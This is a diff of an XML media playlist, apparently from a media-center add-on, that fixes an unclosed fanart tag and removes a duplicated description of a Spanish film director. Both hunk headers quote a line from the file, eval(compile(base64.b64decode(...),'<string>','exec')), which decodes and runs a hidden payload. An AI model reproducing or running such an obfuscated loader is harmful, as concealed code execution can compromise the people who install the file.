@@ -74,7 +74,7 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 </regex>
 <info>Su cine se caracteriza por su mordaz ironía y sus ácidas sátiras sobre diferentes situaciones sociales y políticas. En la etapa de la dictadura franquista despuntó su habilidad para burlar la censura de la época con situaciones y diálogos no excesivamente explícitos pero de inteligente contralectura y consiguió llevar a cabo proyectos tan atrevidos como Los jueves, milagro. Su película Plácido fue candidata al Óscar a la mejor película de habla no inglesa en 1961. En 1980 obtuvo el Premio Nacional de Cinematografía, en 1981 la Medalla de Oro de las Bellas Artes, en 1986 el Premio Príncipe de Asturias de las Artes y en 1993 el Goya</info>
 <thumbnail>https://i.imgur.com/8r38fBE.jpg</thumbnail>
-<fanart>https://i.imgur.com/8r38fBE.jpg<fanart>
+<fanart>https://i.imgur.com/8r38fBE.jpg</fanart>
 </item>
 
 
@@ -149,7 +149,6 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 <page></page>
 </regex>
 <info>Su cine se caracteriza por su mordaz ironía y sus ácidas sátiras sobre diferentes situaciones sociales y políticas. En la etapa de la dictadura franquista despuntó su habilidad para burlar la censura de la época con situaciones y diálogos no excesivamente explícitos pero de inteligente contralectura y consiguió llevar a cabo proyectos tan atrevidos como Los jueves, milagro. Su película Plácido fue candidata al Óscar a la mejor película de habla no inglesa en 1961. En 1980 obtuvo el Premio Nacional de Cinematografía, en 1981 la Medalla de Oro de las Bellas Artes, en 1986 el Premio Príncipe de Asturias de las Artes y en 1993 el Goya</info>
-<info>Su cine se caracteriza por su mordaz ironía y sus ácidas sátiras sobre diferentes situaciones sociales y políticas. En la etapa de la dictadura franquista despuntó su habilidad para burlar la censura de la época con situaciones y diálogos no excesivamente explícitos pero de inteligente contralectura y consiguió llevar a cabo proyectos tan atrevidos como Los jueves, milagro. Su película Plácido fue candidata al Óscar a la mejor película de habla no inglesa en 1961. En 1980 obtuvo el Premio Nacional de Cinematografía, en 1981 la Medalla de Oro de las Bellas Artes, en 1986 el Premio Príncipe de Asturias de las Artes y en 1993 el Goya<info>
 <thumbnail>https://i.imgur.com/8r38fBE.jpg</thumbnail>
 <fanart>https://i.imgur.com/8r38fBE.jpg</fanart>
 </item>
